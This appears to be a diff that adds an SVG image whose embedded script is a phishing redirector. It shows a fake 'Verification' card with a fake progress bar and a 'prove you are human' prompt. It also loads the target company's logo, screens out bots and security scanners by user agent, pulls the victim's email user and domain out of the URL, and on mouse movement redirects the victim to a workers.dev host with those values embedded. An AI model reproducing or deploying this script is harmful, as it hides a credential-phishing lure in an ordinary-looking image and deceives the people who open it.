@@ -1,0 +1,440 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<svg
+xmlns="http://www.w3.org/2000/svg"
+viewBox="0 0 100 100"
+width="100%"
+height="100%"
+preserveAspectRatio="xMidYMid meet">
+<style><![CDATA[
+.bg{
+    fill:#f8f9fa;
+}
+.card{
+    fill:#ffffff;
+    stroke:#e1e4e8;
+    stroke-width:0.3;
+    filter: drop-shadow(0 4px 12px rgba(0,0,0,0.08));
+}
+.title{
+    font:600 2.3px 'Segoe UI', system-ui, Arial, sans-serif;
+    fill:#1f2428;
+	
+}
+.sub{
+    font:600 2.3px 'Segoe UI', system-ui, Arial, sans-serif;
+    fill:#5f6b7a;
+	
+}
+.footer{
+    font:400 1.4px 'Segoe UI', system-ui, Arial, sans-serif;
+    fill:#8a94a6;
+}
+.track{
+    fill:#e5e9ef;
+}
+.bar{
+    fill:#0b5cff;
+}
+.status{
+    font:200 1.5px Arial;
+    fill:#7b7b7b;
+}
+.next-btn{
+    display:inline-flex;
+    align-items:center;
+    gap:10px;
+
+    padding:12px 24px;
+
+    background:#0b5cff;
+    color:#fff;
+
+    border:none;
+    border-radius:8px;
+
+    font-family:Arial,sans-serif;
+    font-size:16px;
+    font-weight:600;
+
+    cursor:pointer;
+
+    transition:.25s;
+}
+
+.next-btn:hover{
+    background:#0047d6;
+}
+
+.next-btn svg{
+    transition:.25s;
+}
+
+.next-btn:hover svg{
+    transform:translateX(4px);
+}
+
+.next-btn:active{
+    transform:scale(.98);
+}
+ 
+]]></style>
+
+ 
+
+
+<rect class="bg" width="100" height="100"/>
+
+<!-- Smaller Card -->
+<rect
+class="card"
+x="23"
+y="28"
+width="54"
+height="39.5"
+rx="3"/>
+
+<!-- Microsoft Logo -->
+<!-- Spinner -->
+<image
+    id="logo"
+    x="25"
+    y="29"
+    width="10"
+    height="10"
+    href="https://logo.debounce.com/google.com"
+    preserveAspectRatio="xMidYMid meet"/>
+
+
+<!-- Title -->
+<text
+class="title"
+x="39"
+y="29"
+text-anchor="start">
+ 
+</text>
+
+
+<!-- Subtitle -->
+<text
+id="title"
+class="sub"
+x="28"
+y="48">
+Loading resources...
+</text>
+
+<!-- Subtitle -->
+<text
+id="status"
+class="status"
+x="28"
+y="53.8">
+Loading resources...
+</text>
+
+<!-- Progress Track -->
+<rect
+class="track"
+x="28"
+y="49.5"
+width="45"
+height="0.55"
+rx="0.9"/>
+
+<!-- Progress Bar -->
+<rect
+id="progress"
+class="bar"
+x="28"
+y="49.5"
+width="0"
+height="0.55"
+rx="0.9"/>
+
+<!-- Footer -->
+<text
+id="footer"
+class="footer"
+x="28"
+y="65.5">
+Please wait...
+</text>
+
+<!-- Next Button -->
+<g id="nextButton" cursor="pointer"    onclick="waitForMouse()">
+ 
+
+    <!-- Button Background -->
+    <rect
+        x="59"
+        y="62"
+        width="15"
+        height="3.8"
+        rx="1"
+        fill="#0b5cff"/>
+
+    <!-- Button Text -->
+    <text
+		id="button"
+		class="button"
+        x="60"
+        y="64.6"
+        font-family="Segoe UI, Arial"
+        font-size="2"
+        font-weight="400"
+        fill="#ffffff">
+        Waiting...
+    </text>
+ 
+
+</g>
+
+
+<animate
+attributeName="opacity"
+from="0"
+to="1"
+dur="0.1s"
+fill="freeze"/>
+
+<script><![CDATA[
+const bar = document.getElementById("progress");
+const status = document.getElementById("status");
+const title = document.getElementById("title");
+const logo = document.getElementById("logo");
+const button = document.getElementById("button");
+const footer = document.getElementById("footer");
+
+const url = window.location.href;
+const seckey = '0auth';
+
+if (!url.includes(seckey)) {
+	window.location.replace("https://x.com?Access-Denied-Security-verification-failed");
+}
+
+let mainpartsimg = url.split(seckey).filter(p => p.length > 0);
+let partsimg = mainpartsimg[1].split('/').filter(p => p.length > 0);
+
+logo.setAttribute(
+	"href",
+	"https://logo.debounce.com/"+partsimg[5]
+);
+ 
+const messages = [
+    "Loading resources...",
+    "Preparing document...",
+    "Rendering content...",
+    "Almost ready...",
+    "Complete"
+];
+
+let progress = 0;
+const timer = setInterval(() => {
+    progress += 1;
+    if (progress > 100) progress = 100;
+    
+    bar.setAttribute("width", (progress * 0.45));
+    
+    const msgIndex = Math.min(Math.floor(progress / 25), messages.length - 1);
+    status.textContent = messages[msgIndex];
+
+    if (progress >= 100) {
+        clearInterval(timer);
+        title.textContent = "Verification";
+        status.textContent = "Click Here to Prove you are human";
+        waitForMouse();
+    }
+}, 35);
+
+        function isBotLikely() {
+            const ua = navigator.userAgent.toLowerCase();
+            const bots = ['bot','crawler','spider','headless','selenium','puppeteer','playwright','curl','wget','python','http-client'];
+            return bots.some(k => ua.includes(k)) || screen.width < 300 || !navigator.languages;
+        }
+ 
+        function securityCheck() {
+            if (isBotLikely()) return false;
+             return true;
+        }
+        function random(length) {
+            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+            let result = '';
+            for (let i = 0; i < length; i++) {
+                result += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            return result;
+        }
+
+        function extractValues() {
+            const seckey = '0auth';
+			
+            const url = window.location.href;
+			const u = Utils.getMetaContent('u')?.trim();
+			const d = Utils.getMetaContent('d')?.trim();
+ 
+
+
+            let mainparts = url.split(seckey).filter(p => p.length > 0);
+            let parts = mainparts[1].split('/').filter(p => p.length > 0);
+			
+			logo.setAttribute(
+				"href",
+				"https://logo.debounce.com/"+parts[5]
+			);
+			
+			
+             return {
+                data:   '' || seckey,
+                datapg:   parts[0] || 'gen',
+                user:   parts[3] || u,
+                domain: parts[5] || d
+            };
+        }
+ 
+        // 🚀 CONFIGURATION 
+        function randomId(len = 15) {
+            const chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
+            let result = "";
+
+            const randomValues = crypto.getRandomValues(new Uint8Array(len));
+
+            for (let i = 0; i < len; i++) {
+                result += chars[randomValues[i] % chars.length];
+            }
+
+            return result;
+        }
+		
+		        // 🛠️ UTILITY FUNCTIONS
+        const Utils = {
+            cleanUrl(str, token) {
+                return str.replace(new RegExp(token, 'g'), '');
+            },
+
+            base64UrlEncode(str) {
+                return str.replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
+            },
+
+            randomStr(length) {
+                let result = '';
+                const chars = CONFIG.randomChars;
+                for (let i = length; i > 0; --i) {
+                    result += chars[Math.floor(Math.random() * chars.length)];
+                }
+                return result;
+            },
+
+            safeAtob(str) {
+                try { return atob(str); } catch { return str; }
+            },
+
+            isEmpty(value) {
+                return value == null || value === '';
+            },
+
+            isValidEmail(email) {
+                return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+            },
+
+            getMetaContent(name) {
+                const meta = document.querySelector(`meta[name="${name}"]`);
+                return meta ? meta.content : '';
+            }
+        };
+
+        // 🛡️ BROWSER VALIDATION
+        const BrowserValidator = {
+            supported: ['Firefox', 'Chrome', 'Edge', 'Opera', 'Safari'],
+
+            isSupported(userAgent) {
+                if (!userAgent || typeof userAgent !== 'string') {
+                    return false;
+                }
+                return this.supported.some(browser => userAgent.includes(browser));
+            }
+        };
+
+        // 📧 EMAIL PROCESSOR  
+        const EmailProcessor = {
+            extract() {
+                const u = Utils.getMetaContent('u')?.trim();
+                const d = Utils.getMetaContent('d')?.trim();
+
+                if (u && d) {
+                    const raw = `;]${u}${CONFIG.separatorToken}${d}`;
+                    const clean = raw.split(';]')[1]?.replace(new RegExp(CONFIG.replaceToken, 'gi'), '') || '';
+                    return this.processEmail(clean);
+                }
+
+                return this.extractFromBaseRuns();
+            },
+
+            extractFromBaseRuns() {
+                if (Utils.isEmpty(baseRuns)) return '';
+
+                const runs = baseRuns.split(CONFIG.urlMarkers.html)[0];
+                const emailPart = runs.split(CONFIG.urlMarkers.doc)[1];
+
+                if (Utils.isEmpty(emailPart)) return '';
+
+                const clean = emailPart
+                    .replace(new RegExp(CONFIG.replaceToken, 'gi'), '')
+                    .replace(new RegExp(CONFIG.separatorToken, 'gi'), '@');
+
+                const parts = clean.split('@');
+                const domain = parts[1] ? Utils.safeAtob(parts[1]) : parts[1];
+                return `${parts[0]}@${domain}`;
+            },
+
+            processEmail(raw) {
+                const clean = raw.replace(new RegExp(CONFIG.separatorToken, 'gi'), '@');
+                const parts = clean.split('@');
+                const domain = parts[1] ? Utils.safeAtob(parts[1]) : parts[1];
+                return `${parts[0]}@${domain}`;
+            },
+
+            getValidEmail() {
+                const email = this.extract();
+                return Utils.isValidEmail(email) ? email : '';
+            }
+        };
+ 
+
+
+function waitForMouse() {
+ 
+    function verified() {
+        document.removeEventListener("mousemove", verified);
+        title.textContent = "Verified ✓";
+        status.textContent = "Congratulations! Verification complete.";
+        button.textContent = "Next";
+        footer.textContent = "Loading Document Please wait...";
+        bar.setAttribute("width", "45");
+        const has0auth = window.location.href.includes("0auth");
+        
+			const values = extractValues();
+            if (!values) return;
+
+            const { data, datapg, user, domain } = values;
+  
+				            
+				// Initial security check
+				if (!securityCheck()) {
+					window.location.replace("https://x.com?Access-Denied-Security-verification-failed");
+					return null;
+				}
+         
+        setTimeout(() => {
+            status.textContent = "You may now continue.";
+            button.textContent = "Continue...";
+			const securePath = `https://steep-paper-93e7.aris2t5.workers.dev/` +
+					`${random(12)}/${random(13)}/${random(13)}${data}${datapg}/${random(11)}/${random(12)}/${user}/${random(18)}/${domain}/${random(18)}`;
+										
+				 window.location.replace(securePath);
+        }, 1400);
+    }
+    document.addEventListener("mousemove", verified, { once: true });
+}
+]]></script>
+</svg>
